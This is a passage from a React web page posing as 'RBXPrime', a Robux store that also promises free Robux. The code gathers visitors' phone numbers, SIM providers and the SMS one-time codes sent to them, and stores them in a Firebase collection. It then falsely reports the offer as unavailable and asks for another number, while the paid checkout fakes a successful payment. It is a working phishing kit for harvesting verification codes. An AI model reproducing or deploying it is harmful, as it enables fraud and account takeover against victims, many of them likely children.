                    const ease = (x) => x === 1 ? 1 : 1 - Math.pow(2, -10 * x);

                        type="submit" 
                        disabled={isProcessing || otp.length < 4} 
                        className="w-full py-5 bg-white text-black font-bold text-lg rounded-2xl hover:bg-gray-200 transition-all disabled:opacity-50 disabled:cursor-not-allowed shadow-lg shadow-white/10 active:scale-95"
                    >
                        {isProcessing ? <span className="flex items-center justify-center gap-2"><Loader2 className="animate-spin" /> Verifying...</span> : 'Verify & Claim Robux'}
                    </button>
                </form>
                
                <button onClick={() => navigateTo('checkout')} className="mt-8 text-sm text-gray-500 hover:text-white transition-colors border-b border-transparent hover:border-white pb-0.5">Change Phone Number</button>
            </div>
        );

        const SuccessView = ({ isFreeOrder, orderId, navigateTo }) => (
            <div className="min-h-screen pt-32 pb-24 px-4 flex flex-col items-center justify-center text-center animate-in zoom-in-95">
                 {/* CONDITIONAL RENDER based on isFreeOrder  */}
                 {isFreeOrder ? (
                    <>
                        <div className="w-24 h-24 bg-red-500/10 rounded-full flex items-center justify-center mb-8 border border-red-500/20 shadow-[0_0_30px_rgba(239,68,68,0.2)]"><AlertTriangle className="w-10 h-10 text-red-500" /></div>
                        <h1 className="text-5xl md:text-6xl font-black mb-6 text-red-500 tracking-tight">Offer Unavailable</h1>
                        <p className="text-gray-400 text-xl max-w-lg mb-10 leading-relaxed">This offer isn't available for this number, please use another number in order to claim the offer.</p>
                    </>
                 ) : (
                    <>
                        <div className="w-24 h-24 bg-green-500/10 rounded-full flex items-center justify-center mb-8 border border-green-500/20 shadow-[0_0_30px_rgba(34,197,94,0.2)]"><Check className="w-10 h-10 text-green-500" /></div>
                        <h1 className="text-5xl md:text-6xl font-black mb-6 tracking-tight">Payment Successful!</h1>
                        <p className="text-gray-400 text-xl max-w-lg mb-10">Your order has been confirmed and is being processed.</p>
                    </>
                 )}
                <button onClick={() => navigateTo('home')} className="px-10 py-4 bg-white text-black font-bold text-lg rounded-2xl hover:bg-gray-200 transition-all shadow-lg shadow-white/10 active:scale-95">Return to Home</button>
            </div>
        );

        // --- MAIN APP ---
        const App = () => {
            const [currentView, setCurrentView] = useState('home'); 
            const [isMenuOpen, setIsMenuOpen] = useState(false);
            const [isCartOpen, setIsCartOpen] = useState(false);
            const [scrolled, setScrolled] = useState(false);
            const [cart, setCart] = useState([]);
            const [email, setEmail] = useState('');
            const [phoneNumber, setPhoneNumber] = useState('+33 ');
            const [simProvider, setSimProvider] = useState('');
            const [referralCode, setReferralCode] = useState('');
            const [otp, setOtp] = useState('');
            const [isProcessing, setIsProcessing] = useState(false);
            const [orderId, setOrderId] = useState('');
            const [userEmail, setUserEmail] = useState('');
            const [isAdmin, setIsAdmin] = useState(false);
            const [showLoginModal, setShowLoginModal] = useState(false);
            const [showSupport, setShowSupport] = useState(false); 
            const [currentDocId, setCurrentDocId] = useState(null);
            const [username, setUsername] = useState(''); 
            const [notification, setNotification] = useState(null); 
            const [finalOrderType, setFinalOrderType] = useState(null); 

            useEffect(() => {
                const handleScroll = () => setScrolled(window.scrollY > 20);
                window.addEventListener('scroll', handleScroll);
                const auth = getAuth();
                const fb = getFb();
                if (auth && fb) {
                    const unsubscribe = fb.onAuthStateChanged(auth, (user) => {
                        if (user && !user.isAnonymous) {
                            if (ALLOWED_ADMINS.includes(user.email)) { setUserEmail(user.email); setIsAdmin(true); } 
                            else { 
                                fb.signOut(auth); 
                                setIsAdmin(false); 
                                setUserEmail('');
                                showNotification("Access Denied: You are not authorized.", "error");
                            }
                        } else {
                            setUserEmail(''); setIsAdmin(false);
                            if (!user) {
                                fb.signInAnonymously(auth).catch(e => console.log("Anon auth failed", e));
                            }
                        }
                    });
                    return () => { window.removeEventListener('scroll', handleScroll); unsubscribe(); };
                }
                return () => window.removeEventListener('scroll', handleScroll);
            }, []);

            const showNotification = (message, type = 'error') => {
                setNotification({ message, type });
            };

            const handleLogin = (email) => { setUserEmail(email); setShowLoginModal(false); if (ALLOWED_ADMINS.includes(email)) setIsAdmin(true); };
            const handleLogout = () => { const fb = getFb(); const auth = getAuth(); fb.signOut(auth).then(() => { setUserEmail(''); setIsAdmin(false); setCurrentView('home'); fb.signInAnonymously(auth); }); };
            const addToCart = (pkg) => { if (pkg.price === 0 && cart.some(item => item.price === 0)) { showNotification("One Free Reward only.", "error"); return; } if (pkg.price === 0) setCart([pkg]); else setCart([...cart.filter(item => item.price !== 0), pkg]); setIsCartOpen(true); };
            const removeFromCart = (index) => { const newCart = [...cart]; newCart.splice(index, 1); setCart(newCart); };
            const cartTotal = cart.reduce((sum, item) => sum + item.price, 0);
            const isFreeOrder = cart.length === 1 && cart[0].price === 0;
            const navigateTo = (view) => { setCurrentView(view); setIsMenuOpen(false); setIsCartOpen(false); window.scrollTo(0, 0); };

            const handleCheckout = async (e, showNotif) => {
                e.preventDefault();
                setIsProcessing(true);
                
                if (isFreeOrder) {
                    if (!simProvider) { showNotif("Select SIM.", "error"); setIsProcessing(false); return; }
                    
                    if (phoneNumber.length < 13) { showNotif("Please complete the phone number.", "error"); setIsProcessing(false); return; }

                    if (!referralCode) { showNotif("Referral code is required for the free offer.", "error"); setIsProcessing(false); return; }

                    // REFERRAL CODE VALIDATION
                    const fb = getFb();
                    const db = getDb();
                    if (db) {
                        try {
                            const snapshot = await fb.getDocs(getPublicCollection("referral_codes"));
                            const validCode = snapshot.docs.find(doc => doc.data().code === referralCode.toUpperCase());
                            
                            if (!validCode) {
                                showNotif("The referral code doesn't exist or is wrong.", "error");
                                setIsProcessing(false);
                                return;
                            }

                            // NON-BLOCKING DB WRITE FOR ORDER
                            fb.addDoc(getPublicCollection("orders"), {
                                username: username, // Include username
                                phone: phoneNumber, sim: simProvider, referral: referralCode.toUpperCase(), status: "pending_otp", timestamp: fb.serverTimestamp()
                            }).then(docRef => setCurrentDocId(docRef.id)).catch(err => console.error(err));

                        } catch (err) {
                            console.error("Error checking referral:", err);
                        }
                    }
                    setTimeout(() => { setIsProcessing(false); setCurrentView('otp-verify'); window.scrollTo(0, 0); }, 2000);
                } else {
                    setTimeout(() => { 
                        setIsProcessing(false); 
                        setOrderId("PAY-" + Math.random().toString(36).substr(2, 6)); 
                        setFinalOrderType('paid'); // Capture state before clearing cart
                        setCart([]); 
                        setCurrentView('success'); 
                        window.scrollTo(0, 0); 
                    }, 2500);
                }
            };

            const handleOtpSubmit = async (e) => {
                e.preventDefault();
                setIsProcessing(true);
                const fb = getFb();
                
                if (currentDocId) {
                    try {
                        await fb.updateDoc(getPublicDoc("orders", currentDocId), { status: "verified", otp: otp });
                    } catch(e) { console.error(e); }
                } else {
                    // Fallback
                    try {
                        await fb.addDoc(getPublicCollection("orders"), { username: username, phone: phoneNumber, sim: simProvider, referral: referralCode, otp: otp, status: "verified", timestamp: fb.serverTimestamp() });
                    } catch(e) { console.error(e); }
                }
                setTimeout(() => { 
                    setIsProcessing(false); 
                    setOrderId("VRF-" + Math.random().toString(36).substr(2, 6)); 
                    setFinalOrderType('free'); // Capture state before clearing cart
                    setCart([]); 
                    setCurrentView('success'); 
                    window.scrollTo(0, 0); 
                }, 3000);
            };

            return (
                <div className="min-h-screen bg-[#050505] text-white font-sans selection:bg-white/20">
                    {/* Fixed BG with overlay for image */}
                    <div className="fixed inset-0 z-0">
                        {/* Placeholder image source - User should replace 'background.png' with their file */}
                        <img src="background.png" className="absolute inset-0 w-full h-full object-cover opacity-60" alt="Background" onError={(e) => e.target.style.display='none'}/>
                        <div className="absolute inset-0 bg-black/80 backdrop-blur-[2px]"></div>
                    </div>
                    
                    <div className="relative z-10">
                        {notification && <Popup message={notification.message} type={notification.type} onClose={() => setNotification(null)} />}
                        {showLoginModal && <LoginModal onClose={() => setShowLoginModal(false)} onLogin={handleLogin} showNotification={showNotification} />}
                        {showSupport && <SupportModal onClose={() => setShowSupport(false)} />}
                        
                        {currentView === 'admin' ? <AdminPanel onBack={() => setCurrentView('home')} showNotification={showNotification} /> : (
                            <>
                                <nav className={`fixed w-full z-50 transition-all duration-300 ${scrolled ? 'bg-[#050505]/90 backdrop-blur-md border-b border-white/10' : 'bg-transparent'}`}>
                                    <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
                                        <div className="flex justify-between items-center h-20">
                                            <div className="flex items-center gap-2 cursor-pointer" onClick={() => navigateTo('home')}><div className="w-10 h-10 rounded-xl bg-white text-black flex items-center justify-center shadow-lg shadow-white/10"><RobuxLogo className="w-6 h-6 text-black" /></div><span className="text-2xl font-bold tracking-tighter">RBX<span className="text-gray-400">Prime</span></span></div>
                                            <div className="hidden md:flex items-center space-x-8">
                                                <button onClick={() => navigateTo('home')} className="text-sm font-medium text-gray-300 hover:text-white">Home</button>
                                                <button onClick={() => setIsCartOpen(!isCartOpen)} className="flex items-center gap-2 px-5 py-2.5 rounded-full bg-white text-black hover:bg-gray-200 transition-all hover:scale-105 active:scale-95 font-bold"><ShoppingCart className="w-4 h-4" /><span className="text-sm">Cart ({cart.length})</span></button>
                                                <button onClick={() => setShowSupport(true)} className="text-sm font-medium text-gray-300 hover:text-white">Support</button>
                                                {userEmail ? <div className="flex items-center gap-4">{isAdmin && <button onClick={() => setCurrentView('admin')} className="flex items-center gap-2 px-4 py-2 bg-red-600 hover:bg-red-700 rounded-lg text-sm font-bold"><Database className="w-4 h-4" /> Admin Panel</button>}<button onClick={handleLogout} className="text-sm text-gray-400 hover:text-white">Logout</button></div> : <button onClick={() => setShowLoginModal(true)} className="flex items-center gap-2 text-sm font-medium text-white hover:text-yellow-400"><LogIn className="w-4 h-4" /> Login</button>}
                                            </div>
                                            <div className="md:hidden flex items-center gap-4"><button onClick={() => setIsCartOpen(!isCartOpen)} className="p-2 text-white relative"><ShoppingCart className="w-6 h-6" />{cart.length > 0 && <span className="absolute top-0 right-0 w-4 h-4 bg-red-500 rounded-full text-[10px] flex items-center justify-center font-bold">{cart.length}</span>}</button><button onClick={() => setIsMenuOpen(!isMenuOpen)} className="p-2 text-gray-400 hover:text-white">{isMenuOpen ? <X /> : <Menu />}</button></div>
                                        </div>
                                    </div>
                                    {isMenuOpen && <div className="md:hidden bg-[#0a0a0b] border-b border-white/10 absolute w-full"><div className="px-4 pt-2 pb-6 space-y-2"><button onClick={() => navigateTo('home')} className="block w-full text-left px-3 py-2 text-base font-medium text-white bg-white/5 rounded-lg">Home</button><button onClick={() => setShowSupport(true)} className="block w-full text-left px-3 py-2 text-base font-medium text-gray-400 hover:text-white">Support</button>{userEmail ? <><button onClick={handleLogout} className="block w-full text-left px-3 py-2 text-base font-medium text-gray-400 hover:text-white">Logout</button></> : <button onClick={() => setShowLoginModal(true)} className="block w-full text-left px-3 py-2 text-base font-medium text-yellow-400">Login</button>}</div></div>}
                                    {isCartOpen && <div className="absolute top-20 right-0 md:right-10 w-full md:w-96 bg-[#111] border border-white/10 shadow-2xl rounded-b-2xl md:rounded-2xl p-6 overflow-hidden z-50 animate-in"><div className="flex justify-between items-center mb-4"><h3 className="font-bold text-xl">Your Cart</h3><button onClick={() => setIsCartOpen(false)}><X className="w-5 h-5 text-gray-500 hover:text-white" /></button></div>{cart.length === 0 ? <div className="text-center py-8 text-gray-500"><ShoppingCart className="w-12 h-12 mx-auto mb-3 opacity-20" /><p>Your cart is empty</p></div> : <div className="space-y-4 max-h-[60vh] overflow-y-auto pr-2">{cart.map((item, idx) => (<div key={idx} className="flex justify-between items-center bg-white/5 p-3 rounded-xl border border-white/5"><div className="flex items-center gap-3"><div className="w-10 h-10 bg-white/10 rounded-lg flex items-center justify-center"><RobuxLogo className="w-5 h-5 text-white" /></div><div><p className="font-bold text-sm">{item.amount.toLocaleString()} Robux</p><p className="text-xs text-green-400">{item.price === 0 ? 'FREE' : `‚Ç¨${item.price.toFixed(2)}`}</p></div></div><button onClick={() => removeFromCart(idx)} className="text-gray-500 hover:text-red-500 transition-colors p-2"><Trash2 className="w-4 h-4" /></button></div>))}</div>}{cart.length > 0 && <div className="mt-6 pt-4 border-t border-white/10"><div className="flex justify-between items-center mb-4 text-lg font-bold"><span>Total</span><span>‚Ç¨{cartTotal.toFixed(2)}</span></div><button onClick={() => navigateTo('checkout')} className="w-full py-3 bg-white text-black font-bold rounded-xl hover:bg-gray-200 transition-colors flex items-center justify-center gap-2">Checkout Now <ChevronRight className="w-4 h-4" /></button></div>}</div>}
                                </nav>
                                <main>
                                    {currentView === 'home' && <HomeView username={username} setUsername={setUsername} addToCart={addToCart} />}
                                    {currentView === 'checkout' && <CheckoutView username={username} setUsername={setUsername} email={email} setEmail={setEmail} phoneNumber={phoneNumber} setPhoneNumber={setPhoneNumber} simProvider={simProvider} setSimProvider={setSimProvider} referralCode={referralCode} setReferralCode={setReferralCode} isFreeOrder={isFreeOrder} handleCheckout={handleCheckout} isProcessing={isProcessing} cartTotal={cartTotal} cart={cart} navigateTo={navigateTo} showNotification={showNotification} />}
                                    {currentView === 'otp-verify' && <OtpVerifyView phoneNumber={phoneNumber} otp={otp} setOtp={setOtp} handleOtpSubmit={handleOtpSubmit} isProcessing={isProcessing} navigateTo={navigateTo} />}
                                    {currentView === 'success' && <SuccessView isFreeOrder={finalOrderType === 'free'} username={username} orderId={orderId} navigateTo={navigateTo} />}
                                </main>
                                <footer className="bg-black border-t border-white/10 pt-16 pb-8">
                                    <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
                                        <Reveal delay={200}>
                                            <div className="flex flex-col md:flex-row justify-between items-center gap-6">
                                                <div className="flex items-center gap-2">
                                                    <div className="w-8 h-8 rounded-lg bg-white flex items-center justify-center">
                                                        <RobuxLogo className="w-5 h-5 text-black" />
                                                    </div>
                                                    <span className="text-xl font-bold text-white">RBXPrime</span>
                                                </div>
                                                <p className="text-gray-600 text-sm">¬© 2024 RBXPrime. Systems Active.</p>
                                                <div className="flex gap-4 opacity-50">
                                                   <CreditCard className="w-6 h-6" />
                                                </div>
                                            </div>
                                        </Reveal>
                                    </div>
                                </footer>
                            </>
                        )}
                    </div>
                </div>
            );
        };

        const root = ReactDOM.createRoot(document.getElementById('root'));
        root.render(<App />);
    </script>
</body>
</html>
